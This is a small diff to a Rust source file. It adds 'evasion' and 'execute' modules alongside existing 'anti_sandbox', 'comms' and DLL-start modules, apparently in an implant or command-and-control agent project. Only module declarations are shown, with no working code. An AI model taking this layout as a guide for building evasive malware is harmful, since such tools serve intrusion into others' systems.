@@ -10,6 +10,8 @@ use crate::utils::export_comptime::{StartType, internal_dll_start};
 mod anti_sandbox;
 mod comms;
 mod entry;
+mod evasion;
+mod execute;
 mod native;
 mod utils;
 mod wyrm;
